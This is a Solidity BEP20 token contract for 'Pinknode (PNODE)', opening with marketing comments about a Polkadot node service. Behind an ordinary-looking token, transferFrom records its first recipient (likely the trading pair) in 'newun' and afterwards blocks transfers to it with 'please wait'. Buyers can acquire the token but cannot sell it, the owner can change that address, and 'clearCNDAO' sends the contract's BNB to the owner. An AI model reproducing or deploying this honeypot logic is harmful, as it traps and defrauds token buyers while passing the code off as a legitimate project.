//**
 //*Submitted for verification at BscScan.com on 2021-04-26

//Pinknode (PNODE)

// NOW IN PANCAKESWAP  

//THE GATEWAY TO THE POLKADOT ECOSYSTEM

//Pinknode empowers developers by providing node-as-a-service solutions, removing an entire layer of inefficiencies and complexities, and accelerating your product life cycle.

//Services

//ANALYTICS
//Our purposefully designed dashboard will help you understand and optimize the inner workings of your infrastructure.

//PROPRIETARY NODES
//If you require nodes of your own, we provide end-to-end node operation services. You’ll never have to worry about your infrastructure needs.

//HTTPS API ENDPOINTS
//Whether you’re testing on Rococo or ready to launch and scale on Kusama and Polkadot, our battle tested API suite will serve you well from launch to scale.

//MAINTENANCE FREE
//We operate, manage and update nodes for developers and teams, so they can focus on building what matters most.

//Platform

//More Developers, More Applications, More Users

//Streamlined onboarding process connecting projects to the Polkadot or Kusama network with a custom Pinknode-powered line of code.

//Our nodes enhance the security of the network by fulfilling the roles of validator, collator and fishermen.

//Immediate node deployment helps to jumpstart new networks

//Projects interact with our purposefully designed dashboard to operate and optimize their infrastructure needs.

//High quality, secure and reliable architecture maintained through strict internal testing protocols, ensuring maximum uptime and 100% data integrity

// Architecture

//Secure and reliable - Our priority is to provide enterprise-grade infrastructure for your peace of mind. We do this by having a strict testing and maintenance protocol.

//High throughput - Innovative caching solution ensuring low-latency, high-volume architecture.

//Polkadot focused - With a broad coverage of upcoming parachains, we run nodes dedicated to the protocol, providing depth and a great user experience.

//Global AutoScale - We scale as you grow with pre-programmed solutions to serve users globally.

//https://pinknode.io/docs/Pinknode_Deck_v1.7.pdf

//https://pinknode.io/docs/lightpaper.pdf

//https://pinknode.io/

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "PNODE";
    name = "Pinknode";
    decimals = 9;
    _totalSupply =  100000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract Pinknode is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}